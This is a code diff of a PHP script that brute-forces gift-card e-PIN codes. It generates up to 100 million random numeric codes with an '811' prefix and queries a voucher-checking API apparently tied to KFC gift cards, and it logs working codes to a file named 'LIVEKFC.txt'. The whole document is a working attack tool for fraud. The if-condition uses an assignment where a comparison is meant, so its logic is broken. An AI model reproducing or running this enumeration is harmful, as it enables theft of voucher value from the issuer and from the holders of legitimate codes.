@@ -5,7 +5,7 @@
             // print_r($data);
             // echo "</pre>";
             $curl = curl_init();
-
+    
             curl_setopt_array($curl, array(
                 CURLOPT_URL => $data['url'],
                 CURLOPT_RETURNTRANSFER => true,
@@ -30,7 +30,7 @@
             else return $response;
         }
         
-        function random($length = 12) {
+        function random($length = 9) {
             $characters = '0123456789';
             $charactersLength = strlen($characters);
             $randomString = '';
@@ -42,8 +42,7 @@
 
 
         function getCode() {
-            $main_url = "http://e-egift.id/redeem.php?code=";
-		  
+            $main_url = "http://sepin.giftn.co.id/api/EPin/AuthEPin?cid=GFN0305&wid=kfc&epin=";
             // return json_encode([]);
             
            
@@ -51,30 +50,27 @@
 
             for($i=0;$i<100000000;$i++){
                 $rand = random() ;
-		  
-			    
 
 
             $curl['code'] = [
-                'url' =>  $main_url.$rand,
+                'url' =>  $main_url."811".$rand,
                 'parser' => null,
                 'header' => [
                     // "Authorization:  Basic ".$this->token,
                     "Content-Type:  application/json",
                 ],
                 'method' => "GET",
-				
                 
             ];
             $results['data']['code'] = $curl['code'];
             $results['result']['code'] = json_decode(getCurl($curl['code']), true);
             
             if($results['result']['code']['rst_msg']="Coupon does not exist."){
-                echo "[ DIE ] - http://e-egift.id/redeem.php?code=".$rand." ".$results['result']['code']['rst_msg'].PHP_EOL;
+                echo "[ DIE ] - 811".$rand." ".$results['result']['code']['rst_msg'].PHP_EOL;
             }
             else{
-                file_put_contents("LIVEKFC.txt", "\nhttp://e-egift.id/redeem.php?code={$rand} | Status: {$results['result']['code']['rst_msg']}", FILE_APPEND);
-                echo "[ d ] - http://e-egift.id/redeem.php?code=".$rand." ".$results['result']['code']['rst_msg'].PHP_EOL;
+                file_put_contents("LIVEKFC.txt", "\n811{$rand} | Status: {$results['result']['code']['rst_msg']}", FILE_APPEND);
+                echo "[ d ] - 811".$rand." ".$results['result']['code']['rst_msg'].PHP_EOL;
             }
 
             $callback = json_encode($results);
